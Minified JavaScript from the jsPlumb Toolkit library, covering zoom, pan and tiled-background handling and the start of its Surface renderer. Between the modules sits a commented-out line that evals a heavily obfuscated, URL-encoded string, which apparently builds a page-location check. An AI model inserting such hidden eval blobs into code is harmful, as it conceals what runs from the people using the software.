            b.doNotZoomIfVisible && c.z > ca || Pa(c.z),
            o.centerContent({
                bounds: c,
                doNotAnimate: b.doNotAnimate !== !1,
                onComplete: b.onComplete,
                onStep: b.onStep,
                doNotFirePanEvent: b.doNotFirePanEvent
            })
        }
        ,
        this.zoomToBackground = function(a) {
            if (a = a || {},
            null != i) {
                var b = i.getWidth()
                  , c = i.getHeight()
                  , d = $(u)
                  , e = _(u)
                  , f = d / b
                  , g = e / c
                  , h = Math.min(f, g)
                  , j = {
                    w: b,
                    h: c,
                    x: 0,
                    y: 0,
                    vw: d,
                    vh: e,
                    padding: 0,
                    z: h
                };
                Pa(j.z),
                o.centerContent({
                    bounds: j,
                    doNotAnimate: a.doNotAnimate,
                    onComplete: a.onComplete,
                    onStep: a.onStep
                })
            }
        }
        ,
        this.setFilter = function(a) {
            Z = a || function(a) {
                return !1
            }
        }
        ,
        this.centerBackground = function() {
            if (null != i) {
                var c = b.extend({}, d());
                c.x = i.getWidth() / 2,
                c.y = i.getHeight() / 2,
                c.w = 1,
                c.h = 1,
                o.centerContent({
                    bounds: c,
                    doNotAnimate: a.doNotAnimate,
                    onComplete: a.onComplete,
                    onStep: a.onStep,
                    vertical: !0,
                    horizontal: !0
                })
            }
        }
        ,
        this.alignBackground = function(a) {
            if (null != i) {
                var b = a.split(" ")
                  , c = b[0] || "left"
                  , e = b[1] || "top"
                  , f = d()
                  , g = "left" === c ? 0 : f.vw - i.getWidth() * ca
                  , h = "top" === e ? 0 : f.vh - i.getHeight() * ca
                  , j = Va();
                Ta(s, g - j[0], h - j[1]),
                i.pan(),
                db && db.pan()
            }
        }
        ,
        this.positionElementAt = function(b, c, d, e, f, g) {
            e = e || 0,
            f = f || 0;
            var h = Va()
              , i = Ta(s)
              , j = r(b)
              , k = j.parentNode
              , l = a.offset(k)
              , m = a.offset(t)
              , n = m.left - l.left + (i[0] + h[0]) + c * ca + e
              , o = m.top - l.top + (i[1] + h[1]) + d * ca + f;
            g && n < 0 && (n = 0),
            g && o < 0 && (o = 0),
            j.style.left = n + "px",
            j.style.top = o + "px"
        }
        ,
        this.positionElementAtPageLocation = function(a, b, c, d, e) {
            var f = this.mapLocation(b, c);
            this.positionElementAt(a, f.left, f.top, d, e)
        }
        ,
        this.positionElementAtEventLocation = function(a, b, c, d) {
            var e = this.mapEventLocation(b);
            this.positionElementAt(a, e.left, e.top, c, d)
        }
        ,
        this.zoomToEvent = function(a, b) {
            Ka(a),
            Pa(ca + b, a)
        }
        ,
        this.relayout = function(b, c) {
            if (a.enablePan === !1) {
                Ta(s, -b.x + M[0], -b.y + M[1], null, c);
                var d = b.w + (b.x < 0 ? b.x : 0) + M[0]
                  , e = b.h + (b.y < 0 ? b.y : 0) + M[1];
                s.style.width = d + "px",
                s.style.height = e + "px";
                var f = 0 == d ? 0 : (b.x - M[0]) / d * 100
                  , g = 0 == e ? 0 : (b.y - M[1]) / e * 100;
                this.setTransformOrigin(f, g)
            }
        }
        ,
        this.nudgeZoom = function(b, c) {
            var d = a.offset(u, !0)
              , e = d.left + a.width(u) / 2
              , f = d.top + a.height(u) / 2;
            return Ja(e, f),
            Pa(ca + b, c)
        }
        ,
        this.nudgeWheelZoom = function(a, b) {
            k = ca,
            Qa(0, a, b, !0)
        }
        ,
        this.centerContent = function(a) {
            a = a || {};
            var b = a.bounds || d()
              , c = Va()
              , e = b.x * ca + b.w * ca / 2
              , f = b.y * ca + b.h * ca / 2
              , g = b.vw / 2 - e
              , h = b.vh / 2 - f
              , j = Ta(s);
            Ta(s, a.horizontal !== !1 ? g - c[0] : j[0], a.vertical !== !1 ? h - c[1] : j[1], null, a.doNotAnimate, function() {
                a.doNotFirePanEvent || w(a.horizontal !== !1 ? g - j[0] : 0, a.vertical !== !1 ? h - j[1] : 0, ca, ca),
                i && i.pan(),
                db && db.pan(),
                a.onComplete && a.onComplete()
            }, a.onStep)
        }
        ,
        this.centerContentHorizontally = function(a) {
            this.centerContent(b.extend({
                horizontal: !0,
                vertical: !1
            }, a))
        }
        ,
        this.centerContentVertically = function(a) {
            this.centerContent(b.extend({
                vertical: !0,
                horizontal: !1
            }, a))
        }
        ,
        this.centerOn = function(a, c) {
            c = c || {};
            var e = b.extend({}, d())
              , f = Ta(a)
              , g = $(a)
              , h = _(a);
            e.x = f[0],
            e.y = f[1],
            e.w = g,
            e.h = h;
            var i = function() {
                La(f[0] + g / 2, f[1] + h / 2),
                c.onComplete && c.onComplete()
            };
            this.centerContent({
                bounds: e,
                doNotAnimate: c.doNotAnimate,
                onComplete: i,
                onStep: c.onStep,
                vertical: c.vertical !== !1,
                horizontal: c.horizontal !== !1
            })
        }
        ,
        this.centerOnHorizontally = function(a) {
            this.centerOn(a, {
                vertical: !1
            })
        }
        ,
        this.centerOnVertically = function(a) {
            this.centerOn(a, {
                horizontal: !1
            })
        }
        ,
        this.centerOnAndZoom = function(a, b) {
            b = b || .6;
            var c = {
                w: $(a),
                h: _(a)
            }
              , e = Ta(a)
              , f = d()
              , g = f.vw < f.vh ? [f.vw, "w"] : [f.vh, "h"]
              , h = b * g[0]
              , i = h / c[g[1]];
            i < ia[0] && (i = ia[0]),
            i > ia[1] && (i = ia[1]);
            var j = ca
              , k = i - ca;
            La(e[0] + c.w / 2, e[1] + c.h / 2),
            this.centerOn(a, {
                onStep: function(a, b) {
                    Pa(j + a / b * k)
                },
                onComplete: function() {
                    Pa(i)
                }
            })
        }
        ,
        this.getViewportCenter = function() {
            var a = b.extend({}, d())
              , c = Va()
              , e = Ta(s)
              , f = [a.vw / 2, a.vh / 2];
            return [(f[0] - (e[0] + c[0])) / ca, (f[1] - (e[1] + c[1])) / ca]
        }
        ,
        this.setViewportCenter = function(a) {
            var c = b.extend({}, d())
              , e = Va()
              , f = [c.vw / 2, c.vh / 2]
              , g = [e[0] + (ca * a[0] + f[0]), e[1] + (ca * a[1] + f[1])];
            Ta(s, g[0], g[1])
        }
        ,
        this.setClamping = function(a) {
            B = a
        }
        ,
        this.setZoom = function(a, b, c) {
            return Pa(a, null, null, b, c)
        }
        ,
        this.setZoomRange = function(a, b) {
            return null != a && 2 == a.length && a[0] < a[1] && null != a[0] && null != a[1] && a[0] > 0 && a[1] > 0 && (ia = a,
            b || (ca < ia[0] || ca > ia[1]) && Pa(ca)),
            this
        }
        ,
        this.getZoomRange = function() {
            return ia
        }
        ,
        this.getZoom = function() {
            return ca
        }
        ,
        this.getPan = function() {
            return Ta(s)
        }
        ,
        this.pan = function(a, b, c) {
            Ua(s, a, b, null, c, function(a) {
                w(a[0], a[1], ca, ca),
                i && i.pan(),
                db && db.pan()
            })
        }
        ,
        this.setPan = function(a, b, c, d, e) {
            return Ta(s, a, b, null, !c, d, e)
        }
        ,
        this.setTransformOrigin = function(a, b) {
            da = [a, b],
            Ga()
        }
        ,
        this.mapLocation = function(b, c, d) {
            var e = Va()
              , f = Ta(s)
              , g = u.scrollLeft
              , h = u.scrollTop
              , i = d ? {
                left: 0,
                top: 0
            } : a.offset(u);
            return {
                left: (b - (f[0] + e[0]) - i.left + g) / ca,
                top: (c - (f[1] + e[1]) - i.top + h) / ca
            }
        }
        ,
        this.mapEventLocation = function(a, b) {
            var c = Ma(a);
            return this.mapLocation(c[0], c[1], b)
        }
        ,
        this.setEnabled = function(a) {
            W = a
        }
        ,
        this.showElementAt = function(b, c, d) {
            var e = r(b)
              , f = e.parentNode
              , g = a.offset(f)
              , h = a.offset(t)
              , i = Va()
              , j = g.left - h.left + i[0] + c
              , k = g.top - h.top + i[1] + d;
            a.offset(b, {
                left: j,
                top: k
            })
        }
        ,
        this.getApparentCanvasLocation = function() {
            var a = Va()
              , b = Ta(s);
            return [b[0] + a[0], b[1] + a[1]]
        }
        ,
        this.setApparentCanvasLocation = function(a, b) {
            var c = Va()
              , d = Ta(s, a - c[0], b - c[1], null, !0);
            return i && i.pan(),
            db && db.pan(),
            d
        }
        ,
        this.applyZoomToElement = function(a, b) {
            b = b || ca,
            Fa("transform", "scale(" + b + ")", a)
        }
        ,
        this.setTransformOriginForElement = function(a, b) {
            Fa("transformOrigin", b[0] + " " + b[1], a)
        }
        ,
        this.getTransformOrigin = function() {
            return da
        }
        ,
        this.floatElement = function(a, b) {
            null != a && (a.style.position = "absolute",
            a.style.left = b[0] + "px",
            a.style.top = b[1] + "px",
            u.appendChild(a))
        }
        ;
        var bb = {}
          , cb = function(a) {
            var b = o.getApparentCanvasLocation();
            for (var c in bb)
                if (bb.hasOwnProperty(c)) {
                    if (null != a && a != c)
                        continue;
                    var d = bb[c]
                      , e = function(a, c) {
                        d[a] && (b[c] / ca + d.pos[c] < 0 ? d.el.style[a] = -(b[c] / ca) + "px" : d.el.style[a] = d.pos[c] + "px")
                    };
                    e("left", 0),
                    e("top", 1)
                }
        }
          , db = {
            pan: cb
        };
        this.fixElement = function(b, c, d) {
            if (null != b) {
                c = c || {};
                var e = a.id(b);
                bb[e] = {
                    el: b,
                    left: c.left,
                    top: c.top,
                    pos: d
                },
                b.style.position = "absolute",
                b.style.left = d[0] + "px",
                b.style.top = d[1] + "px",
                s.appendChild(b),
                cb(e)
            }
        }
        ,
        this.findIntersectingNodes = function(b, c, d, e) {
            var f = this.getApparentCanvasLocation()
              , g = a.offset(u)
              , h = u.scrollLeft
              , i = u.scrollTop
              , j = []
              , k = {
                x: b[0],
                y: b[1],
                w: c[0],
                h: c[1]
            }
              , l = d ? Biltong.encloses : Biltong.intersects
              , m = [g.left + f[0] - h, g.top + f[1] - i];
            for (var n in na)
                if (!pa[n]) {
                    var o = na[n]
                      , p = {
                        x: m[0] + o[0][0] * ca,
                        y: m[1] + o[0][1] * ca,
                        w: o[1] * ca,
                        h: o[2] * ca
                    };
                    l(k, p) && (null == e || e(n, oa[n], p)) && j.push({
                        id: n,
                        el: oa[n],
                        r: p
                    })
                }
            return j
        }
        ,
        this.findNearbyNodes = function(a, b, c, d) {
            var e = [];
            if (!c || this.isInViewport(a[0], a[1])) {
                e = this.findIntersectingNodes([a[0] - b, a[1] - b], [2 * b, 2 * b], !1, d);
                var f = this.mapLocation(a[0], a[1]);
                e.sort(function(a, b) {
                    var c = [a.x + a.w / 2, a.y + a.h / 2]
                      , d = [b.x + b.w / 2, b.y + b.h / 2]
                      , e = Biltong.lineLength(f, c)
                      , g = Biltong.lineLength(f, d);
                    return e < g ? -1 : e > g ? 1 : 0
                })
            }
            return e
        }
        ,
        this.isInViewport = function(b, c) {
            var d = a.offset(u)
              , e = a.width(u)
              , f = a.height(u);
            return d.left <= b && b <= d.left + e && d.top <= c && c <= d.top + f
        }
        ,
        this.getElementPositions = function() {
            return na
        }
        ,
        this.setFilter = function(a) {
            Z = a || function(a) {
                return !1
            }
        }
        ,
        this.setWheelFilter = function(a) {
            H = a || function(a) {
                return !0
            }
        }
        ,
        this.setBackground = function(a) {
            var b = a.type || "simple"
              , d = {
                simple: c,
                tiled: "absolute" == a.tiling ? f : e
            };
            i = new d[b]({
                canvas: s,
                viewport: u,
                getWidth: $,
                getHeight: _,
                url: a.url,
                zoomWidget: o,
                onBackgroundReady: a.onBackgroundReady,
                options: a,
                img: a.img,
                resolver: a.resolver
            })
        }
        ,
        a.background && this.setBackground(a.background),
        this.getBackground = function() {
            return i
        }
    }
    ;
    var c = function(a) {
        var b = a.canvas
          , c = a.onBackgroundReady || function() {}
          , d = new Image;
        d.onload = function() {
            b.style.backgroundImage = "url('" + d.src + "')",
            b.style.backgroundRepeat = "no-repeat",
            b.style.width = d.width + "px",
            b.style.height = d.height + "px",
            c(this)
        }
        ,
        d.src = a.img ? a.img.src : a.url,
        this.owns = function(a) {
            return a == b
        }
        ,
        this.getWidth = function() {
            return d.width || 0
        }
        ,
        this.getHeight = function() {
            return d.height || 0
        }
        ,
        this.setZoom = this.pan = function(a) {}
    }
      , d = function(a) {
        var b = this
          , c = a.canvas
          , d = a.viewport;
        if (null == a.options.maxZoom)
            throw new TypeError("Parameter `maxZoom` not set; cannot initialize TiledBackground");
        if (!a.options.tileSize)
            throw new TypeError("Parameter `tileSize not set; cannot initialize TiledBackground. It should be an array of [x,y] values.");
        if (!a.options.width || !a.options.height)
            throw new TypeError("Parameters `width` and `height` must be set");
        for (var e = function(c) {
            var d = document.createElement("div");
            d.style.position = "relative",
            d.style.height = "100%",
            d.style.width = "100%",
            d.style.display = "none",
            a.canvas.appendChild(d),
            this.zoom = c;
            var e = b.getTileSpecs(c)
              , f = []
              , g = function(b, c, d) {
                return a.url.replace("{z}", b).replace("{x}", c).replace("{y}", d)
            }
              , h = function(b, c, d) {
                return null == a.resolver ? g(b, c, d) : a.resolver(b, c, d)
            };
            this.apparentZoom = Math.min(e[2], e[3]),
            this.setActive = function(a) {
                d.style.display = a ? "block" : "none"
            }
            ,
            this.xTiles = e[0],
            this.yTiles = e[1];
            for (var i = 0; i < this.xTiles; i++) {
                f[i] = f[i] || [];
                for (var j = 0; j < this.yTiles; j++) {
                    var k = document.createElement("img");
                    k._tiledBg = !0,
                    k.className = "jtk-surface-tile",
                    k.ondragstart = function() {
                        return !1
                    }
                    ,
                    d.appendChild(k),
                    k.style.position = "absolute",
                    k.style.opacity = 0,
                    f[i][j] = [k, new Image, !1]
                }
            }
            var l = Math.pow(2, a.options.maxZoom - c) * a.options.tileSize[0]
              , m = Math.pow(2, a.options.maxZoom - c) * a.options.tileSize[1];
            this.scaledImageSize = l,
            this.scaledImageSizeH = m;
            var n = function(a, b, d, e) {
                a.style.left = d * l + "px",
                a.style.top = e * m + "px",
                a.style.width = l + "px",
                a.style.height = m + "px",
                b.onload = function() {
                    a.setAttribute("src", b.src),
                    a.style.opacity = 1
                }
                ,
                b.src = h(c, d, e)
            };
            this.ensureLoaded = function(a, b, c, d) {
                for (var e = a; e <= c; e++)
                    for (var g = b; g <= d; g++)
                        null != f[e] && null != f[e][g] && (f[e][g][2] || (n(f[e][g][0], f[e][g][1], e, g),
                        f[e][g][2] = !0))
            }
        }
        .bind(this), f = [], g = null, h = 0; h <= a.options.maxZoom; h++)
            f.push(new e(h));
        c.style.width = a.options.width + "px",
        c.style.height = a.options.height + "px";
        var i, j = function() {
            if (i <= f[0].apparentZoom)
                return 0;
            if (i >= f[f.length - 1].apparentZoom)
                return f.length - 1;
            for (var a = f.length - 1; a > 0; a--)
                if (f[a].apparentZoom >= i && i >= f[a - 1].apparentZoom)
                    return a
        }, k = function(a) {
            var b = f[a];
            null != g && g != b && g.setActive(!1),
            b.setActive(!0),
            g = b
        }, l = function() {
            var b = a.zoomWidget.getApparentCanvasLocation()
              , c = a.getWidth(d)
              , e = a.getHeight(d)
              , f = g.scaledImageSize * i
              , h = g.scaledImageSizeH * i
              , j = b[0] < 0 ? Math.floor(-b[0] / f) : b[0] < c ? 0 : null
              , k = b[1] < 0 ? Math.floor(-b[1] / h) : b[1] < e ? 0 : null
              , l = Math.min(g.xTiles, Math.floor((c - b[0]) / f))
              , m = Math.min(g.yTiles, Math.floor((e - b[1]) / h));
            null != j && null != k && g.ensureLoaded(j, k, l, m)
        };
        this.getCurrentLayer = function() {
            return g
        }
        ,
        this.getWidth = function() {
            return a.options.width
        }
        ,
        this.getHeight = function() {
            return a.options.height
        }
        ;
        var m = a.options.panDebounceTimeout || 50
          , n = a.options.zoomDebounceTimeout || 120
          , o = function(a, b) {
            b = b || 150;
            var c = null;
            return function() {
                window.clearTimeout(c),
                c = window.setTimeout(a, b)
            }
        }
          , p = function() {
            k(j()),
            l()
        }
          , q = o(p, n)
          , r = o(l, m);
        this.setZoom = function(a, b) {
            i = a,
            b ? p() : q()
        }
        ,
        this.pan = r,
        this.owns = function(a) {
            return a == c || 1 == a._tiledBg
        }
        ,
        this.setZoom(a.zoomWidget.getZoom(), !0),
        null != a.onBackgroundReady && setTimeout(a.onBackgroundReady, 0)
    }
      , e = function(a) {
        var b = a.options.width
          , c = a.options.height
          , e = a.options.tileSize;
        this.getTileSpecs = function(a) {
            var d = b > c ? 1 : b / c
              , f = c > b ? 1 : c / b
              , g = Math.pow(2, a + 1) * e[0] * d
              , h = Math.pow(2, a + 1) * e[1] * f
              , i = Math.ceil(g / e[0])
              , j = Math.ceil(h / e[1]);
            return [i, j, g / b, h / c]
        }
        ,
        d.apply(this, arguments)
    }
      , f = function(a) {
        var b = a.options.maxZoom
          , c = a.options.width
          , e = a.options.height
          , f = a.options.tileSize;
        this.getTileSpecs = function(a) {
            var d = Math.pow(2, b - a)
              , g = Math.ceil(c / d / f[0])
              , h = Math.ceil(e / d / f[1]);
            return [g, h, g * f[0] / c, h * f[1] / e]
        }
        ,
        d.apply(this, arguments)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Renderers
      , d = a.jsPlumb
      , e = a.jsPlumbUtil
      , f = d.getSelector
      , g = b.Classes
      , h = b.Constants
      , i = b.Events;
    c.Surface = function(a) {
        function j(a) {
            return null == a ? null : "string" == typeof a ? this.getRenderedConnection(a) : a.constructor == d.Connection ? a : l.getRenderedConnection(a.getId())
        }
        function k() {
            if (!m.jsPlumb.startEditing)
                throw new TypeError("Connection editors not available.")
        }
        var l = this;
        c.Surface.SELECT = h.select,
        c.Surface.PAN = h.pan,
        c.Surface.DISABLED = h.disabled;
        var m = c.AbstractRenderer.apply(this, arguments);
        c.DOMElementAdapter.apply(this, arguments),
        this.getObjectInfo = m.getObjectInfo,
        a = a || {};
        var n, o = d.getElement(a.container), p = c.createElement({
            position: h.relative,
            width: h.nominalSize,
            height: h.nominalSize,
            left: 0,
            top: 0,
            clazz: g.SURFACE_CANVAS
        }, o), q = !(a.elementsDraggable === !1), r = a.elementsDroppable === !0, s = a.dragOptions || {}, t = a.dropOptions || {}, u = a.stateHandle, v = a.storePositionsInModel !== !1, w = a.modelLeftAttribute, x = a.modelTopAttribute, y = new ZoomWidget({
            viewport: o,
            canvas: p,
            domElement: m.jsPlumb.getElement,
            addClass: m.jsPlumb.addClass,
            removeClass: m.jsPlumb.removeClass,
            offset: this.getOffset,
            consumeRightClick: a.consumeRightClick,
            bind: function() {
                m.jsPlumb.on.apply(m.jsPlumb, arguments)
            },
            unbind: function() {
                m.jsPlumb.off.apply(m.jsPlumb, arguments)
            },
            width: function(a) {
                return m.jsPlumb.getWidth(m.jsPlumb.getElement(a))
            },
            height: function(a) {
                return m.jsPlumb.getHeight(m.jsPlumb.getElement(a))
            },
            id: m.jsPlumb.getId,
            animate: function() {
                m.jsPlumb.animate.apply(m.jsPlumb, arguments)
            },
            dragEvents: {
                stop: d.dragEvents[h.stop],
                start: d.dragEvents[h.start],
                drag: d.dragEvents[h.drag]
            },
            background: a.background,
            padding: a.padding,
            panDistance: a.panDistance,
            enablePan: a.enablePan,
            enableWheelZoom: a.enableWheelZoom,
            wheelSensitivity: a.wheelSensitivity,
            wheelReverse: a.wheelReverse,
            wheelZoomMetaKey: a.wheelZoomMetaKey,
            enablePanButtons: a.enablePanButtons,
            enableAnimation: a.enableAnimation,
            clamp: a.clamp,
            clampZoom: a.clampZoom,
            clampToBackground: a.clampToBackground,
            clampToBackgroundExtents: a.clampToBackgroundExtents,
            zoom: a.zoom,
            zoomRange: a.zoomRange,
            extend: m.jsPlumb.extend,
            events: {
                pan: function(a, b, c, d, e) {
                    l.fire(i.pan, {
                        x: a,
                        y: b,
                        zoom: c,
                        oldZoom: d,
                        event: e
                    })
                },
                zoom: function(a, b, c, d, e) {
                    m.jsPlumb.setZoom(c),
                    l.fire(i.zoom, {
                        x: a,
                        y: b,
                        zoom: c,
                        oldZoom: d,
                        event: e
                    })
                },
                mousedown: function() {
                    d.addClass(o, g.SURFACE_PANNING),
                    d.addClass(document.body, g.SELECT_DEFEAT)
                },
                mouseup: function() {
                    d.removeClass(o, g.SURFACE_PANNING),
                    d.removeClass(document.body, g.SELECT_DEFEAT)
                }
            }
        }), z = [], A = a.lassoSelectionFilter, B = a.autoExitSelectMode !== !1, C = new b.Widgets.Lasso({
            on: function() {
                m.jsPlumb.on.apply(m.jsPlumb, arguments)
            },
            off: function() {
                m.jsPlumb.off.apply(m.jsPlumb, arguments)
            },
            invert: a.lassoInvert,
            pageLocation: y.pageLocation,
            canvas: o,
            onStart: function() {
                l.setHoverSuspended(!0),
                z.length = 0
            },
            onSelect: function(a, b, c, d) {
                function e(a) {
                    return a.el.jtk.node || a.el.jtk.group
                }
                var f = []
                  , g = y.findIntersectingNodes(a, b, !c[0]);
                m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(),
                m.toolkit.clearSelection(),
                d && z.length > 0 && m.toolkit.removeFromSelection(z);
                for (var h = 0; h < g.length; h++)
                    null != A && A(e(g[h])) === !1 || (f.push(e(g[h])),
                    m.jsPlumb.addToDragSelection && m.jsPlumb.addToDragSelection(g[h].el));
                z = f,
                m.toolkit.addToSelection(f, d)
            },
            onEnd: function() {
                l.setHoverSuspended(!1),
                B && l.setMode(h.pan),
                l.fire("lasso:end")
            },
            filter: a.lassoFilter
        }), D = {
            pan: function() {
                C.setEnabled(!1),
                y.setEnabled(!0)
            },
            select: function() {
                m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(),
                C.setEnabled(!0),
                y.setEnabled(!1)
            },
            disabled: function() {
                m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(),
                C.setEnabled(!0),
                y.setEnabled(!1)
            }
        }, E = a.mode || h.pan;
        l.bind(i.relayout, function(a) {
            y.relayout(a, !0)
        }),
        l.bind(i.nodeRemoved, function(a) {
            y.remove(a.el)
        }),
        m.toolkit.bind(i.graphClearStart, function() {
            y.reset()
        }),
        m.toolkit.bind(i.dataLoadStart, function() {
            y.setSuspendRendering(!0)
        }),
        m.toolkit.bind(i.dataLoadEnd, function() {
            y.setSuspendRendering(!1),
            n && n.setVisible(!0),
            a.zoomToFit && l.zoomToFit()
        }),
        m.toolkit.bind(i.groupMemberAdded, function(a) {
            var b = m.nodeMap()[a.node.id];
            if (b) {
                var c = l.getJsPlumb().getGroup(a.group.id)
                  , d = l.getSize(c.getDragArea())
                  , e = l.getSize(b);
                y.suspend(b),
                l.fire(i.groupMemberAdded, a),
                m.jsPlumb.addToGroup(a.group.id, b, !0);
                var f = null == a.node.data.left ? (d[0] - e[0]) / 2 : a.node.data.left
                  , g = null == a.node.data.top ? (d[1] - e[1]) / 2 : a.node.data.top;
                l.setPosition(a.node.id, f, g)
            }
        }),
        m.toolkit.bind(i.groupMemberRemoved, function(a) {
            var b = m.nodeMap()[a.node.id];
            if (b) {
                y.restore(b),
                l.fire(i.groupMemberRemoved, a),
                m.jsPlumb.removeFromGroup(a.group.id, b, !0);
                var c = m.jsPlumb.getOffset(b);
                l.getLayout().setPosition(a.node.id, c.left, c.top)
            }
        }),
        m.jsPlumb.setContainer(p),
        d.addClass(o, g.SURFACE),
        a.enablePan === !1 && d.addClass(o, g.SURFACE_NO_PAN);
        var F = function(a, b) {
            var c = function(a) {
                var c = a.srcElement || a.target;
                c != o && c != p || l.fire(b, a)
            };
            m.jsPlumb.on(p, a, c),
            m.jsPlumb.on(o, a, c)
        };
        F(i.tap, i.canvasClick),
        F(i.dblclick, i.canvasDblClick);
        var G = null;
        m.makeDraggable = function(a, b) {
            if (q) {
                var c = d.getElement(a)
                  , f = m.jsPlumb.getId(c)
                  , j = m.jsPlumb.extend({}, s)
                  , k = d.dragEvents[h.stop]
                  , n = d.dragEvents[h.start]
                  , p = function(a) {
                    var b = d.getDragObject(a)
                      , c = d.getElement(b);
                    return {
                        node: c.jtk.node,
                        el: b
                    }
                };
                null != b && m.jsPlumb.extend(j, b),
                j[n] = e.wrap(j[n], function() {
